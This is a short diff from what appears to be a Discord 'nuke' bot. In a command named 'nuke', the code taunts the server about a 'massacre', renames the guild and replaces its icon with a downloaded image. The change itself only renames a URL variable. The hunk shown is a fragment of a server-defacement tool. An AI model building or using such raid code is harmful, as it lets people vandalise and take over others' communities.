@@ -40,7 +40,7 @@ async def nuke(ctx):
     await ctx.send("You wanna see what the massacre is? ill let u see it")
     await ctx.guild.edit(name=SERVNICK)
     with open('avatar.png', 'wb') as avatar_file:
-        avatar_file.write(rq.get(serverav).content)
+        avatar_file.write(rq.get(SERVAV).content)
     with open('avatar.png', 'rb') as avatar_file:
         avatar = avatar_file.read()
         await ctx.guild.edit(icon=avatar)
